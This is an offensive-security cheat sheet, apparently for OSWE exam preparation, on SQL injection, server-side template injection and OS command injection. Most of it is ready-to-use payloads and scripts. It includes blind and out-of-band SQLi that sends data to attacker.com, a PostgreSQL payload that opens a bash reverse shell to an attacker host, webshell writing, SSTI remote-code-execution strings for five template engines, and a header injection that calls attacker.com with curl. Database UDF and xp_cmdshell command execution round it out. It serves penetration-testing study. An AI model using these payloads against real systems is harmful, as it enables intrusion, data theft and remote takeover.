---
name: "Injection Attacks — SQLi, SSTI & OS Command Injection"
description: "Blind SQL injection (error-based, time-based, OOB), ORM injection (Hibernate, Entity Framework), PostgreSQL COPY FROM PROGRAM RCE, SSTI detection and exploitation by template engine (Jinja2, Twig, FreeMarker, Jade, Handlebars), OS command injection patterns, WebSocket exploitation, and database UDF RCE."
tags: [oswe, sqli, ssti, os-command-injection, postgresql, jinja2, websocket, rce, orm-injection]
---

## SQL Injection Advanced

### Blind SQL Injection — Error-Based

```sql
-- MySQL error-based via double query
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a) --

-- PostgreSQL error-based
' OR CAST((SELECT version()) AS numeric) --

-- MSSQL error-based
' OR 1/@@servername --
```

### Blind SQL Injection — Time-Based

```python
import requests, time

TARGET = "http://target/api/users?id="

def test_time_based(payload):
    start = time.time()
    r = requests.get(TARGET + payload)
    elapsed = time.time() - start
    return elapsed > 5

# MySQL: SLEEP(5) | PostgreSQL: pg_sleep(5) | MSSQL: WAITFOR DELAY '0:0:5'

def extract_char(payload_template, position):
    for c in "abcdef0123456789":
        payload = payload_template.replace("$POS$", str(position)).replace("$CHAR$", c)
        if test_time_based(payload):
            return c
    return None
```

### Out-of-Band (OOB) SQL Injection

```sql
-- MySQL OOB
' LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\test')) --

-- PostgreSQL OOB via COPY
' COPY (SELECT version()) TO PROGRAM 'nslookup $(cat /etc/hostname).attacker.com' --

-- MSSQL OOB via xp_dirtree
' EXEC master..xp_dirtree '\\attacker.com\share' --
```

### ORM Injection

```java
// Hibernate HQL Injection — unsafe string concatenation
String hql = "FROM users WHERE username = '" + input + "'";
Query query = session.createQuery(hql);

// JPA Criteria API — safe
CriteriaBuilder cb = em.getCriteriaBuilder();
CriteriaQuery<User> cq = cb.createQuery(User.class);
Root<User> root = cq.from(User.class);
cq.where(cb.equal(root.get("username"), input));
```

```csharp
// Entity Framework — unsafe
var users = context.Users.FromSqlRaw($"SELECT * FROM Users WHERE username = '{input}'").ToList();

// Entity Framework — safe
var users = context.Users.FromSqlRaw("SELECT * FROM Users WHERE username = @p0", input).ToList();
```

### PostgreSQL Specific: Copy From Program RCE

```sql
-- RCE via COPY FROM PROGRAM (PostgreSQL 9.3+)
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/443 0>&1"'; --

-- RCE via lo_import/lo_export — write webshell
'; SELECT lo_import('/etc/passwd'); --
'; SELECT lo_export(12345, '/var/www/html/shell.php'); --
```

---

## Server-Side Template Injection (SSTI)

### Detection

```
{{7*7}} → 49
${7*7} → 49
*{7*7} → 49
#{7*7} → 49
{{7*'7'}} → 7777777 (Python string multiplication)
```

### Jinja2 (Python)

```python
# Basic RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Cari subprocess.Popen
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'Popen' %}
    {{ c('id', shell=True, stdout=-1).communicate() }}
  {% endif %}
{% endfor %}

# Shortcut via __builtins__
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Config access (Flask)
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### Twig (PHP)

```php
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
{{ ['id'] | filter('exec') }}
```

### FreeMarker (Java)

```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Jade/Pug (Node.js)

```javascript
#{root = this}
#{root.process.mainModule.require('child_process').execSync('id')}
- var x = global.process.mainModule.require('child_process').execSync('id')
= x
```

### Handlebars (Node.js)

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.split "substring")}}
      {{this.push "constructor"}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.split.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### SSTI Mitigation

```python
# SAFE: render_template (file-based)
from flask import render_template
return render_template('user.html', name=name)

# UNSAFE: render_template_string (inline template with user input)
from flask import render_template_string
return render_template_string(f"Hello {{name}}", name=name)
```

---

## OS Command Injection & WebSocket Exploitation

### Command Injection Patterns

```python
# Common injection characters
chars = [';', '|', '&', '&&', '||', '`', '$()', '\n', '%0a']

# Linux: ;, |, &&, ||, `command`, $(command)
# Windows: &, |, &&, ||, %command%

# Blind command injection with time delay
# Linux: ; sleep 5
# Windows: & ping -n 5 127.0.0.1 &
```

### Command Injection via WebSocket

```python
import websocket, json

TARGET_WS = "wss://target/ws/execute"

def websocket_cmd_inject(command):
    ws = websocket.WebSocket()
    ws.connect(TARGET_WS)
    payload = {
        "type": "command",
        "cmd": "ping",
        "host": f"127.0.0.1; {command}"  # Injection point
    }
    ws.send(json.dumps(payload))
    response = ws.recv()
    ws.close()
    return response
```

### Command Injection via HTTP Headers

```python
import requests
headers = {
    "User-Agent": "'; curl http://attacker.com/$(whoami); '",
    "X-Forwarded-For": "127.0.0.1; id"
}
r = requests.get(TARGET, headers=headers)
```

### RCE via Database Functions

```sql
-- PostgreSQL UDF RCE
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');

-- H2 Database RCE via CREATE ALIAS
'; CREATE ALIAS IF NOT EXISTS shell AS $$ String shell(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return ""; }$$; CALL shell('powershell -enc BASE64'); --

-- MySQL UDF RCE
SELECT sys_eval('id');

-- MSSQL xp_cmdshell
EXEC xp_cmdshell 'whoami';
```
